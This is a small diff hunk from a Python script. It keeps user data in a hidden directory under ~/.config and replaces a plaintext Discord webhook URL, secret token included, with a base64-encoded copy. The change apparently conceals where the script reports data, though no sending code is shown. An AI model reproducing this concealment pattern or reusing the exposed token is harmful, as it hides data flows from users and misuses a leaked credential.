@@ -11,7 +11,7 @@ SECRET_DIR = os.path.expanduser("~/.config/.hidden_directory/")
 SECRET_FILE = os.path.join(SECRET_DIR, "hidden_users.json")
 
 # Ganti webhook lu kalau belum
-DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1360660554968076298/b7bs6DF1kQBpA9aoyLgOEbxEmCJ2bdlLM_m4loXP2SCUehFzBI3KFKe5lwrfTozlfxsY"
+DISCORD_WEBHOOK = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM2MDY2MDU1NDk2ODA3NjI5OC9iN2JzNkRGMWtRQnBBOWFveUxnT0VieEVtQ0oyYmRsTE1fbTRsb1hQMlNDVWVoRnpCSTNLRktlNWx3cmZUb3psZnhzWQ=="
 
 # --- Load user dari file ---
 def load_users():
